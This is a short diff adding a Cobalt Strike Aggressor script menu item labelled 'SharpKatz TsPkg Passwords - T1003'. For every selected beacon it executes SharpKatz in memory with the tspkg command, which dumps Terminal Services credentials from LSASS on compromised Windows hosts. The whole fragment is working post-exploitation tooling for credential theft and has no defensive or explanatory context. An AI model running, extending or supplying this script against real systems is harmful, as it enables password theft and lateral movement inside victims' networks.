@@ -1,0 +1,15 @@
+item "SharpKatz TsPkg Passwords  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			sktspkg($bid);
+		}
+	}
+	
+	
+	
+sub sktspkg{
+
+bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command tspkg");
+
+}
+	
